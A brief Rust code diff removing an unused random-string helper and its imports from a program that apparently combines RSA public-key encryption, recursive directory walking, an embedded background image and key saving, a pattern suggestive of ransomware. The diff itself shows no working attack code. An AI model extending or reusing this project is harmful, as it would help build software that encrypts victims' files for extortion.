@@ -16,8 +16,6 @@ use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
 use rsa::RsaPublicKey;
 
-use rand::distributions::Alphanumeric;
-use rand::Rng;
 use walkdir::WalkDir;
 
 const IMAGE_DATA: &[u8] = include_bytes!(r"resources\backgroound.png");
@@ -150,15 +148,6 @@ SwIDAQAB
         return;
     }
 
-}
-
-fn generate_random_string(length: usize) -> String {
-    let s : String = rand::thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(length)
-        .map(char::from)
-        .collect();
-    s
 }
 
 fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
